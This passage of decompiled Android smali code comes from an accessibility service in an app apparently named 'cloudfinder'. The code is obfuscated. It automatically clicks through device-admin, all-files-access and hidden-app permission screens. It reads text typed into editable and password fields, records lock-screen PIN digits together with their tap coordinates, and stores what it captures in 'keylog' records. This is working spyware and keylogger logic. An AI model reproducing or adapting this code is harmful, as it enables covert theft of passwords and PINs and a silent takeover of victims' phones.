    const-string v3, "com.miui.permcenter.privacymanager.DeviceManagerApplyActivity"

    invoke-virtual {v3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_6

    if-eqz p1, :cond_8

    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    const-string v4, "deviceadmin"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_8

    :cond_6
    invoke-virtual {v2, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_7

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_7

    invoke-interface {v0, v7}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {p1, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return-void

    :cond_7
    invoke-virtual {v2, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_8

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_8

    invoke-interface {v0, v7}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_8
    if-eqz p1, :cond_a

    const-string v0, "com.android.settings.Settings$AppManageExternalStorageActivity"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    const-string v0, "com.android.settings.Settings$ManageExternalStorageActivity"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    :cond_9
    invoke-static {v2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ر(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_a
    const-string v0, "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_b

    invoke-static {v2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ذ(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_b
    :goto_1
    return-void
.end method

.method public final غ(Landroid/view/accessibility/AccessibilityEvent;Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 14

    move-object/from16 v0, p2

    move-object/from16 v1, p5

    move-object/from16 v2, p6

    const-string v3, "@"

    const-string v4, "keylog_c_"

    :try_start_0
    invoke-static {}, Lسۄھؤۏ۫/؋;->ذ()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    const/4 v5, 0x1

    const/4 v6, 0x0

    if-eqz v0, :cond_5

    :try_start_1
    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v7

    if-eqz v7, :cond_1

    invoke-virtual {v7}, Ljava/lang/String;->isEmpty()Z

    move-result v8

    if-nez v8, :cond_1

    const-string v8, "com.android.systemui:id/back"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-nez v8, :cond_0

    const-string v8, "com.android.systemui:id/recent_apps"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_1

    :cond_0
    sget-object v7, Lcom/lite/cloudfinder/App;->آ:Landroid/os/Handler;

    if-eqz v7, :cond_1

    new-instance v8, Lةؽڗںۍټ٘/؋;

    const/4 v9, 0x7

    invoke-direct {v8, v9}, Lةؽڗںۍټ٘/؋;-><init>(I)V

    invoke-virtual {v7, v8}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_1
    :try_start_2
    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    move-result v7

    if-eqz v7, :cond_5

    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->isFocusable()Z

    move-result v7

    if-eqz v7, :cond_5

    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v7
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    const-string v8, ""

    if-eqz v7, :cond_2

    :try_start_3
    invoke-interface {v7}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v7

    goto :goto_0

    :cond_2
    move-object v7, v8

    :goto_0
    invoke-virtual {v7}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->isPassword()Z

    move-result v7
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    if-eqz v7, :cond_4

    :try_start_4
    invoke-static/range {p2 .. p2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ض(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    move-result-object v7

    if-eqz v7, :cond_3

    invoke-virtual {v7, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_3

    invoke-virtual {v7, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    aget-object v8, v3, v5
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    :catch_2
    :cond_3
    :try_start_5
    invoke-virtual {v8}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_5

    sput-object v8, Lسۄھؤۏ۫/؋;->س:Ljava/lang/String;

    goto :goto_1

    :cond_4
    sput-object v6, Lسۄھؤۏ۫/؋;->س:Ljava/lang/String;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    :catch_3
    :cond_5
    :goto_1
    invoke-static/range {p3 .. p3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_17

    invoke-static/range {p3 .. p3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_6

    goto/16 :goto_6

    :cond_6
    if-nez v0, :cond_7

    goto/16 :goto_6

    :cond_7
    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    if-eqz v3, :cond_8

    invoke-interface {v3}, Ljava/lang/CharSequence;->length()I

    move-result v7

    if-lez v7, :cond_8

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    goto :goto_2

    :cond_8
    move-object v3, v6

    :goto_2
    if-eqz v3, :cond_9

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v7

    if-eqz v7, :cond_a

    :cond_9
    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v7

    if-eqz v7, :cond_a

    invoke-interface {v7}, Ljava/lang/CharSequence;->length()I

    move-result v8

    if-lez v8, :cond_a

    invoke-interface {v7}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    :cond_a
    if-eqz v3, :cond_b

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v7

    if-eqz v7, :cond_c

    :cond_b
    :try_start_6
    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v7

    if-eqz v7, :cond_c

    invoke-virtual {v7}, Ljava/lang/String;->isEmpty()Z

    move-result v8
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    if-nez v8, :cond_c

    move-object v3, v7

    :catch_4
    :cond_c
    if-eqz v3, :cond_d

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v7

    if-eqz v7, :cond_e

    :cond_d
    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v7

    if-eqz v7, :cond_e

    invoke-interface {v7}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    :cond_e
    if-eqz v3, :cond_f

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v7

    if-eqz v7, :cond_10

    :cond_f
    if-eqz v1, :cond_10

    invoke-virtual/range {p5 .. p5}, Ljava/lang/String;->isEmpty()Z

    move-result v7

    if-nez v7, :cond_10

    move-object v3, v1

    :cond_10
    if-eqz v3, :cond_17

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v7

    if-eqz v7, :cond_11

    goto/16 :goto_6

    :cond_11
    sget-object v7, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ظ:Ljava/util/HashSet;

    invoke-virtual {v7, v3}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v7

    const-string v8, ";"

    const-string v9, ","

    if-eqz v7, :cond_14

    sget-object v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ش:Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->length()I

    move-result v5

    if-lez v5, :cond_17

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->lastIndexOf(Ljava/lang/String;)I

    move-result v5

    const/4 v7, 0x0

    if-ltz v5, :cond_12

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->setLength(I)V

    goto :goto_3

    :cond_12
    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->setLength(I)V

    :goto_3
    sget-object v5, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ص:Ljava/lang/StringBuilder;

    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->lastIndexOf(Ljava/lang/String;)I

    move-result v8

    if-ltz v8, :cond_13

    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->setLength(I)V

    goto :goto_4

    :cond_13
    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->setLength(I)V

    :goto_4
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v7, "PIN_DELETE buf="

    invoke-direct {v5, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    goto :goto_5

    :cond_14
    sget-object v7, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ط:Ljava/util/HashMap;

    invoke-virtual {v7, v3}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_17

    invoke-virtual {v7, v3}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/Boolean;

    if-eqz v7, :cond_17

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_17

    sget-object v7, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ش:Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->length()I

    move-result v10

    if-lez v10, :cond_15

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_15
    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :try_start_7
    new-instance v7, Landroid/graphics/Rect;

    invoke-direct {v7}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v0, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    iget v10, v7, Landroid/graphics/Rect;->left:I

    iget v11, v7, Landroid/graphics/Rect;->right:I

    add-int/2addr v10, v11

    div-int/lit8 v10, v10, 0x2

    iget v11, v7, Landroid/graphics/Rect;->top:I

    iget v7, v7, Landroid/graphics/Rect;->bottom:I

    add-int/2addr v11, v7

    div-int/lit8 v11, v11, 0x2

    sget-object v7, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ص:Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->length()I

    move-result v12

    if-lez v12, :cond_16

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_16
    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_5

    :catch_5
    sput-boolean v5, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ض:Z

    const-string v5, "PIN_CAPTURE digit="

    const-string v7, " buf="

    invoke-static {v5, v3, v7}, Landroidx/activity/result/؋;->ث(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    sget-object v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ش:Ljava/lang/StringBuilder;

    :goto_5
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v5, "MyAccessSvc"

    invoke-static {v5, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_17
    :goto_6
    move-object/from16 v3, p3

    :try_start_8
    invoke-static {v0, v3, v1, v2}, Lڝږ؁ڋ/ك;->إ(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_6

    :catch_6
    :try_start_9
    invoke-virtual {p0, p1}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؤ(Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result v5
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_7

    if-eqz v5, :cond_18

    return-void

    :catch_7
    :cond_18
    move-object v5, p0

    move-object/from16 v7, p4

    :try_start_a
    invoke-virtual {p0, v7}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ع(Ljava/lang/String;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_8

    :catch_8
    if-eqz v0, :cond_1e

    :try_start_b
    invoke-static/range {p3 .. p3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_1e

    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_19

    invoke-interface {v0}, Ljava/lang/CharSequence;->length()I

    move-result v7

    if-lez v7, :cond_19

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v6

    :cond_19
    if-eqz v6, :cond_1a

    invoke-virtual {v6}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_1b

    :cond_1a
    if-eqz v2, :cond_1b

    invoke-virtual/range {p6 .. p6}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1b

    goto :goto_7

    :cond_1b
    move-object v2, v6

    :goto_7
    if-eqz v2, :cond_1c

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_1d

    :cond_1c
    if-eqz v1, :cond_1d

    invoke-virtual/range {p5 .. p5}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1d

    move-object v12, v1

    goto :goto_8

    :cond_1d
    move-object v12, v2

    :goto_8
    if-eqz v12, :cond_1e

    invoke-virtual {v12}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1e

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->nanoTime()J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {}, Lسۄھؤۏ۫/؋;->ذ()Ljava/lang/String;

    move-result-object v8

    const-string v10, "click"

    const-string v11, "keylog"

    const/4 v13, 0x0

    move-object/from16 v9, p3

    invoke-static/range {v7 .. v13}, Lڜٟٱڀ/ت;->؋(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_9

    :catch_9
    :cond_1e
    return-void
.end method

.method public final ؽ(Landroid/view/accessibility/AccessibilityEvent;Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/lang/String;)V
    .locals 17

    move-object/from16 v1, p2

    move-object/from16 v8, p3

    move-object/from16 v0, p4

    const-string v9, "_"

    const-string v2, "@"

    if-eqz v1, :cond_0

    if-eqz v0, :cond_0

    const-string v3, "EditText"

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    sput-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ة:Landroid/view/accessibility/AccessibilityNodeInfo;

    :cond_0
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ب:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-virtual/range {p0 .. p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ح()V

    :cond_1
    if-nez v1, :cond_2

    return-void

    :cond_2
    :try_start_0
    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->و(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_6

    const-string v3, ""

    if-eqz v0, :cond_3

    :try_start_1
    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    move-object v11, v0

    goto :goto_0

    :cond_3
    move-object v11, v3

    :goto_0
    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->isPassword()Z

    move-result v0

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getAddedCount()I

    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    move-result v4

    if-eqz v4, :cond_4

    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->isFocusable()Z

    move-result v4

    if-eqz v4, :cond_4

    invoke-virtual {v11}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_6

    :cond_4
    const/4 v4, 0x1

    :try_start_2
    invoke-static/range {p2 .. p2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ض(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    move-result-object v5

    if-eqz v5, :cond_5

    invoke-virtual {v5, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_5

    invoke-virtual {v5, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    aget-object v2, v2, v4
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_1

    :catch_0
    :cond_5
    move-object v2, v3

    :goto_1
    const/4 v12, 0x0

    if-eqz v0, :cond_6

    :try_start_3
    sput-object v2, Lسۄھؤۏ۫/؋;->س:Ljava/lang/String;

    goto :goto_2

    :cond_6
    sput-object v12, Lسۄھؤۏ۫/؋;->س:Ljava/lang/String;

    :goto_2
    invoke-virtual {v11}, Ljava/lang/String;->isEmpty()Z

    move-result v2
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_6

    if-eqz v2, :cond_7

    return-void

    :cond_7
    :try_start_4
    invoke-static {v8, v11, v10, v0}, Lڝږ؁ڋ/ك;->ؤ(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    :catch_1
    const/4 v2, 0x0

    :try_start_5
    sget-object v5, Lسۄھؤۏ۫/؋;->خ:Lorg/json/JSONArray;

    if-eqz v5, :cond_a

    sget-object v5, Lسۄھؤۏ۫/؋;->خ:Lorg/json/JSONArray;

    move v6, v2

    :goto_3
    invoke-virtual {v5}, Lorg/json/JSONArray;->length()I

    move-result v7

    if-ge v6, v7, :cond_a

    invoke-virtual {v5, v6}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v7

    if-eqz v7, :cond_9

    const-string v13, "used"

    invoke-virtual {v7, v13, v2}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v13

    if-eqz v13, :cond_9

    const-string v13, "pkg"

    invoke-virtual {v7, v13, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v8, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    if-eqz v7, :cond_9

    :try_start_6
    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getHintText()Ljava/lang/CharSequence;

    move-result-object v5

    if-eqz v5, :cond_8

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2

    goto :goto_4

    :catch_2
    :cond_8
    move-object v5, v3

    :goto_4
    :try_start_7
    invoke-static {v8, v11, v5, v10, v0}, Lڝږ؁ڋ/ء;->آ(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    goto :goto_5

    :cond_9
    add-int/lit8 v6, v6, 0x1

    goto :goto_3

    :catch_3
    :cond_a
    :goto_5
    if-eqz v0, :cond_15

    move v0, v2

    :goto_6
    :try_start_8
    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v5

    const v6, 0xfe61

    const/16 v7, 0x2731

    const/16 v9, 0x2a

    const/16 v13, 0x25c9

    const/16 v14, 0x25cf

    const/16 v15, 0x2022

    if-ge v0, v5, :cond_c

    invoke-virtual {v11, v0}, Ljava/lang/String;->charAt(I)C

    move-result v5

    if-eq v5, v15, :cond_b

    if-eq v5, v14, :cond_b

    if-eq v5, v13, :cond_b

    if-eq v5, v7, :cond_b

    if-eq v5, v6, :cond_b

    if-eq v5, v9, :cond_b

    move v0, v2

    goto :goto_7

    :cond_b
    add-int/lit8 v0, v0, 0x1

    goto :goto_6

    :cond_c
    move v0, v4

    :goto_7
    if-nez v0, :cond_10

    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_10

    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v0

    sub-int/2addr v0, v4

    invoke-virtual {v11, v0}, Ljava/lang/String;->charAt(I)C

    move-result v0

    if-eq v0, v15, :cond_10

    if-eq v0, v14, :cond_10

    if-eq v0, v13, :cond_10

    if-eq v0, v9, :cond_10

    move v5, v2

    :goto_8
    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v16

    add-int/lit8 v12, v16, -0x1

    if-ge v5, v12, :cond_e

    invoke-virtual {v11, v5}, Ljava/lang/String;->charAt(I)C

    move-result v12

    if-eq v12, v15, :cond_d

    if-eq v12, v14, :cond_d

    if-eq v12, v13, :cond_d

    if-eq v12, v7, :cond_d

    if-eq v12, v6, :cond_d

    if-eq v12, v9, :cond_d

    move v5, v2

    goto :goto_9

    :cond_d
    add-int/lit8 v5, v5, 0x1

    const/4 v12, 0x0

    goto :goto_8

    :cond_e
    move v5, v4

    :goto_9
    if-nez v5, :cond_f

    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v5

    if-ne v5, v4, :cond_10

    :cond_f
    invoke-static {v0}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v3

    :cond_10
    sget v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؼ:I

    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v5
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_6

    const-string v6, "ime"

    if-le v0, v5, :cond_12

    :try_start_9
    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_12

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v5, Lسۄھؤۏ۫/؋;->س:Ljava/lang/String;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getFromIndex()I

    move-result v5

    sub-int/2addr v5, v4

    invoke-static {v2, v5}, Ljava/lang/Math;->max(II)I

    move-result v5

    sget-object v7, Lڜٟٱڀ/ت;->ؤ:Ljava/util/concurrent/ConcurrentHashMap;
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_6

    if-nez v0, :cond_11

    goto :goto_b

    :cond_11
    :try_start_a
    sget-object v7, Lڜٟٱڀ/ت;->ؤ:Ljava/util/concurrent/ConcurrentHashMap;

    invoke-virtual {v7, v0}, Ljava/util/concurrent/ConcurrentHashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lorg/json/JSONObject;

    if-eqz v0, :cond_12

    const-string v7, "text"

    invoke-virtual {v0, v7}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v0

    if-eqz v0, :cond_12

    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v7

    if-lez v7, :cond_12

    if-ltz v5, :cond_12

    :goto_a
    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v7

    if-le v7, v5, :cond_12

    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v7

    if-lez v7, :cond_12

    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v7

    add-int/lit8 v7, v7, -0x1

    invoke-virtual {v0, v7}, Lorg/json/JSONArray;->remove(I)Ljava/lang/Object;
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_4

    goto :goto_a

    :catch_4
    move-exception v0

    :try_start_b
    const-string v5, "KeylogEngine"

    const-string v7, "handleDelete error"

    invoke-static {v5, v7, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_12
    :goto_b
